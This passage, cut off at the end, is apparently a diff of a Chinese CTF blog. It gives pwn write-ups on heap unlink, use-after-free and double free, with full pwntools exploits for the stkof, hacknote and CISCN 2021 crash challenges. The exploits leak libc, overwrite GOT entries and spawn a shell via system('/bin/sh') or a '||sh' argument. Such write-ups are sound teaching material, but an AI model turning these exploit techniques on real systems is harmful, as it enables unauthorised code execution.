+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;stkof&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;stkof&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26259</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,size,content</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendline(content)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">chunk = <span class="number">0x602150</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x30</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0xf0</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x100</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">payload =  p64(<span class="number">0</span>) + p64(<span class="number">0x31</span>) + p64(chunk-<span class="number">0x18</span>)+p64(chunk-<span class="number">0x10</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x30</span>)+p64(<span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x18</span>+ p64(atoi_got)+p64(atoi_got)+p64(free_got)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(puts_plt)),p64(puts_plt))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45226</span>,<span class="number">0x4527a</span>,<span class="number">0xf03a4</span>,<span class="number">0xf1247</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">one_gadget = libc_base + one[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">4</span>,<span class="built_in">len</span>(p64(system)),p64(system))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#p.sendline(&#x27;/bin/sh\x00&#x27;)</span></span><br><span class="line">edit(<span class="number">5</span>,<span class="number">0x8</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 ]]></content>
       <categories>
-        <category>Crypto</category>
+        <category>pwn</category>
       </categories>
       <tags>
         <tag>笔记</tag>
-        <tag>古典密码</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>UAF</title>
+    <url>/2021/10/04/UAF/</url>
+    <content><![CDATA[<h1>Use after free</h1>
+<h2 id="原理"><a class="header-anchor" href="#原理">¶</a>原理</h2>
+<pre><code>就是某块内存释放后，任能被用户使用，即存在野指针（一般是free后没有将指针置NULL）
+</code></pre>
+<span id="more"></span>
+<h3 id="样例"><a class="header-anchor" href="#样例">¶</a>样例</h3>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span></span><br><span class="line">  <span class="keyword">char</span> *myname;</span><br><span class="line">  <span class="keyword">void</span> (*func)(<span class="keyword">char</span> *str);</span><br><span class="line">&#125; NAME;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  NAME *a;</span><br><span class="line">  a = (NAME *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct name));</span><br><span class="line">  a-&gt;func = myprint;</span><br><span class="line">  a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// free without modify</span></span><br><span class="line">  <span class="built_in">free</span>(a);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;I can also use it&quot;</span>);</span><br><span class="line">  <span class="comment">// free with modify</span></span><br><span class="line">  a-&gt;func = printmyname;</span><br><span class="line">  a-&gt;func(<span class="string">&quot;this is my function&quot;</span>);</span><br><span class="line">  <span class="comment">// set NULL</span></span><br><span class="line">  a = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);</span><br><span class="line">  a-&gt;func(<span class="string">&quot;can not be printed...&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="malloc内存对齐"><a class="header-anchor" href="#malloc内存对齐">¶</a>malloc内存对齐</h3>
+<p>在大多数情况下，编译器和C库透明地帮你处理对齐问题。POSIX 标明了通过malloc( ), calloc( ), 和 realloc( ) 返回的地址对于任何的C类型来说都是对齐的。这样可以避免内存中的碎片，提高程序效率。</p>
+<p>来看下malloc.h的部分源码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#  <span class="meta-keyword">define</span> MALLOC_ALIGNMENT       (2 *SIZE_SZ &lt; __alignof__ (long double)   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MALLOC_ALIGN_MASK      (MALLOC_ALIGNMENT - 1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest possible chunk */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MIN_CHUNK_SIZE        (offsetof(struct malloc_chunk, fd_nextsize))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* The smallest size we can malloc is an aligned minimal chunk */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MINSIZE  \</span></span><br><span class="line"><span class="meta">  (unsigned long)(((MIN_CHUNK_SIZE+MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* pad request bytes into a usable size -- internal version */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> request2size(req)                                         \</span></span><br><span class="line"><span class="meta">  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \</span></span><br><span class="line"><span class="meta">   MINSIZE :                                                      \</span></span><br><span class="line"><span class="meta">   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>翻译翻译就是malloc在对其的时侯，其对其参数必须是2的幂且在32为下8byte,64位下为16byte</p>
+<p>但是最小分配单位并不是对齐单位，最小分配单位MINSIZE：</p>
+<p>计算MINSIZE=（16+8-1） &amp; ~（8-1）=16字节</p>
+<p>即32位下malloc的最小分配单位为16字节，64位下最小分配单位为32字节。</p>
+<p>其中request2size就是malloc的内存对齐操作。</p>
+<p>从request2size还可以知道，如果是64位系统，申请内存为1~24字节时，系统内存消耗32字节，当申请内存为25字节时，系统内存消耗48字节。 如果是32位系统，申请内存为1~12字节时，系统内存消耗16字节，当申请内存为13字节时，系统内存消耗24字节。（类似计算MINSIZE）</p>
+<h3 id="UAF-的利用"><a class="header-anchor" href="#UAF-的利用">¶</a>UAF 的利用</h3>
+<p>当申请两个fastbin范围内的堆块后，fastbin如下图所示</p>
+<p><img src="http://static.zybuluo.com/hgggg/i7inxma7n1gx14yc77t3f824/31.png" alt="31.png-16.6kB"></p>
+<p>此时可以利用UAF修改chunk0的指针，当我们再次申请出这两个堆的时候，就可以申请到想要修改的地址处,进行后续的一些修改</p>
+<h3 id="double-free"><a class="header-anchor" href="#double-free">¶</a>double free</h3>
+<p>double free 和 UAF 一样同样也是由于指针为清空造成的漏洞，与UAF的漏洞利用方式差不多，常被用于与fastbin attack 组合利用</p>
+<p>下面介绍一种利用double free 来达到任意地址写的利用方式</p>
+<p>当申请两个堆块并且释放时fastbin中有如下结构：</p>
+<pre><code>fastbin[Y] -&gt; chunk1 -&gt; chunk0
+</code></pre>
+<p>而此时我们再次释放chunk1</p>
+<pre><code>fastbin[Y] -&gt; chunk0 -&gt;  &lt;- chunk1 
+</code></pre>
+<p>如果我们此时申请一个新的chunk</p>
+<p><img src="http://static.zybuluo.com/hgggg/71qyoakamj0w6w0xbywxwzmp/32.png" alt="32.png-14.2kB"></p>
+<p>此时修改new chunk的指针</p>
+<p><img src="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png" alt="33.png-19.6kB"></p>
+<p>再申请一个chunk1</p>
+<p><img src="http://static.zybuluo.com/hgggg/vevy3cstvblcgtha3rphjc9n/34.png" alt="34.png-17.1kB"></p>
+<p>在申请一个chunk后这个chunk就会合chunk1重合，且fastbin链表已经指向了我们想要修改的地址了，只要再申请一个堆块就会申请到想要修改的地址，然后只要编辑这个堆块便可完成任意地址写。</p>
+<p><img src="http://static.zybuluo.com/hgggg/wj1tdtf92h6wmo5khhpfl6st/35.png" alt="35.png-21.6kB"></p>
+<h2 id="例题"><a class="header-anchor" href="#例题">¶</a>例题</h2>
+<h3 id="hacknote"><a class="header-anchor" href="#hacknote">¶</a>hacknote</h3>
+<h4 id="IDA-分析"><a class="header-anchor" href="#IDA-分析">¶</a>IDA 分析</h4>
+<p>add<br>
+<img src="http://static.zybuluo.com/hgggg/6ptrl1aq1a1u68hla9ixm5pg/25.png" alt="25.png-60.2kB"></p>
+<p>delete<br>
+<img src="http://static.zybuluo.com/hgggg/2oqox20pffmb7diztd5htwkl/26.png" alt="26.png-44.3kB"></p>
+<h4 id="利用思路"><a class="header-anchor" href="#利用思路">¶</a>利用思路</h4>
+<p><img src="http://static.zybuluo.com/hgggg/2n71il94qre8z0swlok1n29f/27.png" alt="27.png-77.8kB"></p>
+<p>由上图可以看到，当我们申请一个note的时候，此时堆块的结构如下图所示</p>
+<p><img src="http://static.zybuluo.com/hgggg/z1bunz0mfb0mxrboc7tgftsy/28.png" alt="28.png-23.5kB"></p>
+<p>具体利用方式如下</p>
+<p>我们申请两个note,在进行释放</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+<p><img src="http://static.zybuluo.com/hgggg/fmih4vz2wd4oizhkb5tw9pm7/29.png" alt="29.png-24.9kB"></p>
+<p>此时struct note被放到fastbin[0] , content 被放入fastbin<a href="http://static.zybuluo.com/hgggg/fl430uwnapavh55zpng9hj8g/33.png">3</a></p>
+<p>如果我们申请一个大小在fastbin[0]范围内的堆note2,那么note2 的struct note 和 content就会分别是fastbin[0]中的note1,和note0的struct note</p>
+<p>因此新建的note2的strcut note将被分配到note1的结构体位置，note2的content将被分配到note0的结构体位置，note0八字节的结构体处分别存放了打印函数0x804862b和其参数地址，现在将被我们输入的content覆盖</p>
+<p>如果我们将content 覆盖为 __libc_start_main的地址 那么我们就可以泄露 libc 了 , 同理可以梅开二度getshell</p>
+<p>这里还有一个小坑，覆盖后system的参数实际上是从note0结构体开始的，所以要用到system参数截断的姿势，如：&amp;&amp;sh，||sh，;sh;</p>
+<p><img src="http://static.zybuluo.com/hgggg/76xhtazyt1dokdpz0a6xp6gv/30.png" alt="30.png-84kB"></p>
+<p>可以看到最后成功调用了system(‘sh’)</p>
+<h4 id="exp"><a class="header-anchor" href="#exp">¶</a>exp</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p = remote(&#x27;node4.buuoj.cn&#x27;,27510)</span></span><br><span class="line">p=process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Note size :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Content :&#x27;</span>)</span><br><span class="line">	p.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Your choice :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">	p.recvuntil(<span class="string">&#x27;Index :&#x27;</span>)</span><br><span class="line">	p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">libc_start_main = elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">add(<span class="number">8</span>,p32(<span class="number">0x804862B</span>)+p32(libc_start_main))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(p.recv(<span class="number">4</span>)) - <span class="number">0x18550</span> </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system)+<span class="string">b&#x27;||sh&#x27;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="CISCN-2021-西南赛区-crash"><a class="header-anchor" href="#CISCN-2021-西南赛区-crash">¶</a>CISCN 2021 西南赛区 crash</h3>
+<p>这个题和HCTF的fheap，不能说是完全相同，只能说是一模一样了，但当时只有两个队做出来</p>
+<p>这道题在网上的解法一般都是UAF，这里提供一种double free + ret2csu 的思路</p>
+<h4 id="程序分析"><a class="header-anchor" href="#程序分析">¶</a>程序分析</h4>
+<p>ADD</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">add</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+4h] [rbp-102Ch]</span></span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-1028h]</span></span><br><span class="line">  <span class="keyword">char</span> *dest; <span class="comment">// [rsp+10h] [rbp-1020h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytes; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">size_t</span> nbytesa; <span class="comment">// [rsp+18h] [rbp-1018h]</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">4104</span>]; <span class="comment">// [rsp+20h] [rbp-1010h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v7; <span class="comment">// [rsp+1028h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v7 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Pls give data size:&quot;</span>);</span><br><span class="line">  nbytes = (<span class="keyword">int</span>)getInt();</span><br><span class="line">  <span class="keyword">if</span> ( nbytes &lt;= <span class="number">0x1000</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;data:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, buf, nbytes) == <span class="number">-1</span> )</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    nbytesa = <span class="built_in">strlen</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> ( nbytesa &gt; <span class="number">0xF</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      dest = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytesa);</span><br><span class="line">      <span class="keyword">if</span> ( !dest )</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">      <span class="built_in">strncpy</span>(dest, buf, nbytesa);</span><br><span class="line">      *(_QWORD *)ptr = dest;</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeLong;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">strncpy</span>(ptr, buf, nbytesa);</span><br><span class="line">      *((_QWORD *)ptr + <span class="number">3</span>) = freeShort;</span><br><span class="line">    &#125;</span><br><span class="line">    *((_DWORD *)ptr + <span class="number">4</span>) = nbytesa;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_DWORD *)&amp;Strings + <span class="number">4</span> * i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *((_DWORD *)&amp;Strings + <span class="number">4</span> * i) = <span class="number">1</span>;</span><br><span class="line">        qword_2020E8[<span class="number">2</span> * i] = ptr;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;The string id is %d\n&quot;</span>, (<span class="keyword">unsigned</span> <span class="keyword">int</span>)i);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( i == <span class="number">16</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;The string list is full&quot;</span>);</span><br><span class="line">      (*((<span class="keyword">void</span> (__fastcall **)(<span class="keyword">char</span> *))ptr + <span class="number">3</span>))(ptr);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Invalid size&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(ptr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v7;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>freeLong 的汇编代码如下， freeShort 和 它差不多都存在UAF</p>
+<p><img src="http://static.zybuluo.com/hgggg/mk8t3gtc5l76hghd8wst9ent/36.png" alt="36.png-28.6kB"></p>
+<p>主要的漏洞点在Delete</p>
+<p><img src="http://static.zybuluo.com/hgggg/0kdpfqzbu2bg4gev9rppwe3w/37.png" alt="37.png-48.5kB"></p>
+<h4 id="利用方式"><a class="header-anchor" href="#利用方式">¶</a>利用方式</h4>
+<pre><code>    IDA 中可以看到 call puts 与 freeShort 和 freeLong在同一
+页，这样的话如果我们可以利用double free覆盖freeLong的地址的后两位
+为call puts的地址,当我们delete的时候就会调用call puts 打印出字符
+串地址开始的内容，call puts 的地址就在这串内容里，这样可以泄露程序
+基址。
+
+拿到程序地址之后就可以结合double free 利用delete的里溢出来ret2csu
+
+bss段没有足够的空间来写入/bin/sh所以要往data段写
+</code></pre>
+<p>具体不多说(<s>主要是懒</s>)：直接上exp</p>
+<h4 id="exp-v2"><a class="header-anchor" href="#exp-v2">¶</a>exp</h4>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> system</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p  = process(<span class="string">&quot;crash&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;crash&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;192.168.43.181&#x27;,55000)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,data</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;add &#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Pls give data size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;data:&#x27;</span>,data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">idx</span>):</span></span><br><span class="line">    p.sendline(<span class="string">&#x27;delete &#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Are you sure?:&#x27;</span>,<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line">add(<span class="number">4</span>,<span class="string">&#x27;aaa&#x27;</span>) </span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">&#x27;\x00&#x27;</span>)  </span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>+<span class="string">b&#x27;\x0b\x00&#x27;</span>) </span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;c&#x27;</span>*<span class="number">0x18</span>)</span><br><span class="line">elf_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0xd0b</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(elf_base))</span><br><span class="line"></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">0x000000000000119c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119e : pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a0 : pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a2 : pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119f : pop rbp ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000a80 : pop rbp ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a3 : pop rdi ; ret</span></span><br><span class="line"><span class="string">0x00000000000011a1 : pop rsi ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x000000000000119d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span></span><br><span class="line"><span class="string">0x0000000000000929 : ret</span></span><br><span class="line"><span class="string">0x0000000000000962 : ret 0x2016</span></span><br><span class="line"><span class="string">0x000000000000102b : ret 0x8b48</span></span><br><span class="line"><span class="string">0x0000000000000dd2 : ret 0x8d48</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pop_rdi = elf_base + <span class="number">0x11a3</span></span><br><span class="line">puts_plt = elf_base + elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got = elf_base + elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main = elf_base + elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">pop_4 = elf_base + <span class="number">0x119c</span></span><br><span class="line">read_got = elf_base + elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_6 = elf_base + <span class="number">0x119a</span></span><br><span class="line">rop2 = elf_base + <span class="number">0x1180</span></span><br><span class="line">bin_sh = elf_base + <span class="number">0x202080</span> </span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4</span>,<span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x20</span>,<span class="string">b&#x27;d&#x27;</span>*<span class="number">0x18</span>+p64(pop_4)) <span 